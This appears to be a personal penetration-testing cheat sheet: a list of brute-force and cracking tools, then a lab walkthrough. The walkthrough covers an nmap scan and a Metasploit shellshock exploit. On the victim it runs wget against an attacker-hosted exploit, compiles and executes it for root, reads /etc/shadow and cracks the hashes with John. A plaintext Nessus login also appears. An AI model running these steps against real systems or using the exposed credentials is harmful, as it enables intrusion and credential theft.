# CyberTIAN

## Brute Force Tools

### URI, DNS Subdomain, Virtual Host, and Cloud Bucket Brute Forcing
- **Gobuster**: Brute-forcing URI, DNS subdomains, virtual hosts, Amazon S3 buckets, and Google Cloud buckets.

### Web Application Brute Forcing
- **OWASP ZAP**: Brute-forcing web applications.
- **Burp Suite**: Brute-forcing web app authentication.

## Password Brute Force Tools
- **John the Ripper**: Offline password cracking.
- **Hashcat**: GPU-based password recovery.
- **Hydra**: Brute-forcing remote authentication protocols.
- **Medusa**: Large-scale brute-forcing, similar to Hydra.

## SSH Brute Force Tools
- **Patator**: Brute-forcing SSH, FTP, and HTTP.
- **THC Hydra**: SSH brute-forcing.
- **Brutespray**: Automates brute-forcing using Nmap results.

## Wireless Password Cracking Tools
- **Aircrack-ng**: Cracking WEP and WPA encryption.
- **Reaver**: Exploits WPS vulnerabilities.
- **Wifite**: Automated Wi-Fi cracking.

## DNS Brute Forcing Tools
- **DNSRecon**: Brute-forcing DNS subdomains.

## Home Network Vulnerability Scanning with Tenable Nessus
1. Navigate to the Nessus portal at port `8834`.
2. Use the following credentials:
   - **Username**: `Shinzer`
   - **Password**: `Aoki122501-`
3. Steps:
   - Create a **New Scan**.
   - Select **Basic Network Scan**.
   - Run the scan.

## CVE Databases
- **NVD (National Vulnerability Database)**: Comprehensive list of vulnerabilities.
- **CVE Details**: Detailed CVE reports.
- **MITRE CVE**: Official CVE records.

## Testing Methodologies
1. **Black Box Testing**: No prior information about the target.
2. **White Box Testing**: Full disclosure of target information.

## Penetration Testing Methodology

### 1. Scanning the Target Using Nmap
- Commands:
  - `nmap <IP address>`: Basic scan.
  - `-sV`: Detect service versions.
  - `-O`: Check the operating system.
  - `-p1-65535`: Scan all ports.
- Complete Command:
  ```bash
  sudo nmap 192.168.0.114 -sV -O -p1-65535
  ```

### 2. Enumerate Vulnerabilities
- Find exploits for identified vulnerabilities.

### 3. Directory Enumeration
- Check for server openings:
  ```bash
  dirb http://192.168.0.114
  ```

### 4. Exploitation Using Metasploit
- Start Metasploit:
  ```bash
  sudo msfconsole
  ```
- Example Workflow:
  1. Search for an exploit:
     ```bash
     search shellshock
     ```
  2. Select an exploit:
     ```bash
     use <exploit_number>
     ```
  3. Configure payload:
     ```bash
     show options
     set RHOSTS 192.168.0.114
     set RPATH /bin
     set TARGETURI /cgi-bin/hello_world.sh
     exploit
     ```
  4. Verify system information:
     ```bash
     sysinfo
     ```
  5. Dump credentials:
     ```bash
     shell
     cat /etc/shadow
     ```

### 5. Privilege Escalation
1. **Attacker Machine Setup**
   - Download the exploit:
     ```bash
     cd exploitdb/exploits/linux/local/
     touch 37292.c
     mousepad 37292.c
     ```
   - Paste contents from the exploit database and set up the server:
     ```bash
     sudo systemctl start apache2.service
     cp 37292.c /var/www/html
     ```

2. **Victim Machine Commands (via Meterpreter)**
   - Download and compile the exploit:
     ```bash
     cd /tmp
     shell
     wget http://192.168.0.192/37292.c
     gcc 37292.c -o ofs
     chmod +x ofs
     ./ofs
     ```
   - Verify elevated privileges:
     ```bash
     whoami
     ```
   - Dump credentials:
     ```bash
     cat /etc/shadow
     cat /etc/passwd
     ```

3. **Password Cracking**
   - Save credentials to the attacker machine and unshadow files:
     ```bash
     unshadow passwd shadow > unshadowed.txt
     john --wordlist=/usr/share/wordlist/rockyou.txt unshadowed.txt
     ```
   - View cracked passwords:
     ```bash
     john --show unshadowed.txt
     ```

4. **Access via SSH**
   - Use the cracked credentials:
     ```bash
     ssh user@<IP_address>
     
